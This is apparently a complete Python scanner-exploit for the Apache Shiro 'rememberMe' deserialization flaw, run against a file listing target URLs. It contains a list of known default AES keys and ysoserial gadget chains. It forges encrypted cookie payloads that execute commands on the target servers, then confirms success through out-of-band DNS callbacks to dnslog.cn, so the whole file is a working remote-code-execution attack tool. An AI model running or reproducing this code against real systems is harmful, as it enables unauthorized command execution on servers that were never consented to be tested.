import uuid
import base64
import uuid
import subprocess
import requests
import sys
import time
from Crypto.Cipher import AES
import threading
import random
from multiprocessing.dummy import Pool as ThreadPool
requests.urllib3.disable_warnings()
cipherkeys=["kPH+bIxk5D2deZiIxcaaaA==","2AvVhdsgUs0FSA3SDFAdag==","3AvVhmFLUs0KTA3Kprsdag==","4AvVhmFLUs0KTA3Kprsdag==","5aaC5qKm5oqA5pyvAAAAAA==","6ZmI6I2j5Y+R5aSn5ZOlAA==",
			"bWljcm9zAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==","Z3VucwAAAAAAAAAAAAAAAA==","MTIzNDU2Nzg5MGFiY2RlZg==","U3ByaW5nQmxhZGUAAAAAAA==","5AvVhmFLUs0KTA3Kprsdag==",
			"fCq+/xW488hMTCD+cmJ3aQ==","1QWLxg+NYmxraMoxAXu/Iw==","ZUdsaGJuSmxibVI2ZHc9PQ==","L7RioUULEFhRyxM7a2R/Yg==","r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==",
			"a2VlcE9uR29pbmdBbmRGaQ==","WcfHGU25gNnTxTlmJMeSpw==","ZAvph3dsQs0FSL3SDFAdag==","tiVV6g3uZBGfgshesAQbjA==","cmVtZW1iZXJNZQAAAAAAAA==","ZnJlc2h6Y24xMjM0NTY3OA==",
			"RVZBTk5JR0hUTFlfV0FPVQ==","WkhBTkdYSUFPSEVJX0NBVA=="]
gadgets=["CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7",
		 "CommonsCollections8","CommonsCollections9","CommonsCollections10","Jdk7u21","Hibernate1","Hibernate2","Spring1","Spring2","Spring3","Myfaces1","Myfaces2","C3P0",
		 "Clojure","FileUpload1","Groovy1","BeanShell1","JBossInterceptors1","JSON1","JavassistWeld1","Jython1","MozillaRhino1","MozillaRhino2","ROME","Vaadin1","Wicket1"]
def genpayload1(command, CipherKey):
    popen = subprocess.Popen(['java','-jar','ysoserial.jar','URLDNS',command],stdout=subprocess.PIPE,stderr = subprocess.STDOUT)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC	
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(CipherKey), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
def genpayload2(params, CipherKey):
    gadget,command = params
    popen = subprocess.Popen(['java','-jar','ysoserial.jar',gadget,command],stdout=subprocess.PIPE,stderr = subprocess.STDOUT)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC	
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(CipherKey), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
def getkey(url):
	tmpdict={}
	s=requests.session()
	domain=s.get("http://www.dnslog.cn/getdomain.php?t="+str(random.randint(100000,999999)),timeout=10).text
	for cipherkey in cipherkeys:
		try:
			flag=str(uuid.uuid4()).replace('-','')
			payload=genpayload1('http://'+flag+'.'+domain,cipherkey)
			requests.get(url,cookies={'rememberMe':payload.decode()},timeout=10)
			tmpdict[flag]=cipherkey
		except:
			pass
	time.sleep(3)
	r=s.get('http://www.dnslog.cn/getrecords.php')
	for i in tmpdict.keys():
		if i in r.text:
			return tmpdict[i]
	return None
def getgadget(url,key):
	tmpdict={}
	s=requests.session()
	domain=s.get("http://www.dnslog.cn/getdomain.php?t="+str(random.randint(100000,999999)),timeout=10).text
	for gadget in gadgets:
		try:
			flag=str(uuid.uuid4()).replace('-','')
			command1='ping -c 2 '+flag+'.'+domain
			command2='ping -n 2 '+flag+'.'+domain
			payload1=genpayload2((gadget,command1),key)
			payload2=genpayload2((gadget,command2),key)
			requests.get(url,cookies={'rememberMe':payload1.decode()},timeout=10)
			requests.get(url,cookies={'rememberMe':payload2.decode()},timeout=10)
			tmpdict[flag]=gadget
		except:
			pass
	time.sleep(3)
	r=s.get('http://www.dnslog.cn/getrecords.php')
	for i in tmpdict.keys():
		if i in r.text:
			return tmpdict[i]
	return None
def checkurl(url):
	key=getkey(url)
	if key!=None and key!='':
		gadget=getgadget(url,key)
		if gadget!=None and gadget!='':
			print(url+' has shiro550 key:'+key+' gadget:'+gadget)
def getshirourl(urls):
    for i in urls:
        i=i.strip()
        try:
            cookies={'rememberMe':'123'}
            r=requests.get(i,timeout=5,cookies=cookies,verify=False)
            flag=r.headers['Set-Cookie']
            if 'rememberMe' in flag:
            	t=threading.Thread(target=checkurl,args=(r.url,))
            	t.start()
            	t.join()
        except:
        	pass
if len(sys.argv)<=1:
	print('usage: python shiro_scan.py [filename] [num of thread]')
	sys.exit()
path=sys.argv[1]
threadnum=int(sys.argv[2])
f=open(path,'r')
aurls=f.readlines()
length=len(aurls)
step=length//threadnum
lt=[]
i=0
while i<threadnum:
    if step==0:
        lt.append(aurls[0:])
        break
    if i+1==threadnum:
    	lt.append(aurls[i*step:])
    else:
    	lt.append(aurls[i*step:(i+1)*step])
    i+=1
pool = ThreadPool()    
pool.map(getshirourl,lt)
pool.close()
pool.join()
